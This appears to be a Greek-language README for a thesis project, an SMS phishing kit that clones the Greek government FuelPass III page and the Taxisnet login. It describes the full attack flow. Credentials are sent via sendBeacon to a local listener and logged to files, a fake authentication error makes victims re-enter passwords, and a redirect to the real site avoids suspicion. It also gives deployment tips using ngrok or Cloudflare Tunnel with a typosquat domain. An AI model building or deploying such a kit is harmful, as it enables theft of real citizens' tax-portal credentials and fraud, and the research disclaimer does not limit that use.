# SMS Phishing Prototype — Κλώνος FuelPass III

**Δημιουργός:** [@Charis-Stikos](https://github.com/Charis-Stikos)

Πρωτότυπο smishing για την πτυχιακή εργασία. Αυστηρά για εργαστηριακή χρήση.

---

## Σενάριο επίθεσης

1. Το θύμα λαμβάνει SMS με σύντομο URL που μιμείται το `vouchers.gov.gr/fuelpass/appfront`.
2. Ανοίγει το link σε mobile browser και φορτώνει τον κλώνο της landing σελίδας FuelPass III.
3. Πατάει το CTA «Είσοδος με κωδικούς Taxisnet» και μεταβαίνει στον κλώνο της πύλης Taxisnet OAuth2.
4. Τα διαπιστευτήρια στέλνονται στον τοπικό listener (`server/server.js`) και καταγράφονται σε `captures.txt` και `captures.jsonl`.
5. Στην πρώτη υποβολή εμφανίζεται ψεύτικο μήνυμα «Αποτυχία στην Αυθεντικοποίηση», ώστε να ξαναπληκτρολογήσει ο χρήστης. Στη δεύτερη υποβολή γίνεται redirect στο πραγματικό `vouchers.gov.gr` για να μην υποψιαστεί το θύμα.

---

## Δομή φακέλου

```
SMS-phishing-prototype/
├── public/
│   ├── index.html       # Landing FuelPass III
│   ├── styles.css
│   ├── login.html       # Κλώνος Taxisnet OAuth2 + exfiltration script
│   └── login.css
├── server/
│   ├── server.js        # Express listener
│   ├── package.json
│   └── .gitignore
└── README.md
```

---

## URL pattern

Ο listener σερβίρει τις σελίδες κάτω από spoofed path που μιμείται την πραγματική δομή του gov.gr:

| Τύπος         | URL                                                   |
| ------------- | ----------------------------------------------------- |
| Πραγματικό    | `https://vouchers.gov.gr/fuelpass/appfront`           |
| Lab (local)   | `http://localhost:3000/fuelpass/appfront`             |
| Login (lab)   | `http://localhost:3000/fuelpass/appfront/login`       |
| Capture       | `POST http://localhost:3000/fuelpass/appfront/capture`|

Για realistic deployment μπορείς να εκθέσεις το `localhost:3000` με Cloudflare Tunnel ή ngrok και να βάλεις το URL σε short link ή typosquat domain (π.χ. `vouchers-gov.gr`).

---

## Εκτέλεση

```bash
cd server
npm install
npm start
```

Άνοιξε σε mobile browser:

```
http://localhost:3000/fuelpass/appfront
```

---

## Τεχνικές λεπτομέρειες

- **Exfiltration:** Το `login.html` χρησιμοποιεί `navigator.sendBeacon` για να σταλούν τα στοιχεία στο `/capture`. Αν δεν υπάρχει υποστήριξη, fallback σε `fetch` με `keepalive: true`. Έτσι το request επιβιώνει ακόμα και αν η σελίδα κάνει redirect αμέσως μετά.
- **Δύο προσπάθειες:** Στην πρώτη υποβολή εμφανίζεται error overlay και ξαναζητείται ο κωδικός — έτσι αν το θύμα έγραψε λάθος, καταγράφονται και οι δύο εκδοχές. Μετά τη δεύτερη υποβολή γίνεται redirect στο πραγματικό `vouchers.gov.gr/`.
- **Καταγραφή IP:** Λαμβάνεται το `x-forwarded-for` ή το `socket.remoteAddress` (αφαιρώντας το πρόθεμα `::ffff:` για IPv4-mapped διευθύνσεις).

---

## Captures

Κάθε υποβολή καταγράφεται σε δύο μορφές:

- `server/captures.txt` — ανθρώπινα αναγνώσιμη μορφή (timestamp, IP, username, password, attempt, user-agent).
- `server/captures.jsonl` — μία γραμμή JSON ανά capture, για ανάλυση στην πτυχιακή.

Παρακολούθηση σε real time:

```bash
tail -f server/captures.txt
```

---

## Disclaimer

Αυστηρά για ερευνητικούς και εκπαιδευτικούς σκοπούς στο πλαίσιο πτυχιακής εργασίας. Δεν επιτρέπεται η ανάπτυξη ή χρήση σε πραγματικό περιβάλλον ή σε στόχους τρίτων χωρίς ρητή άδεια.
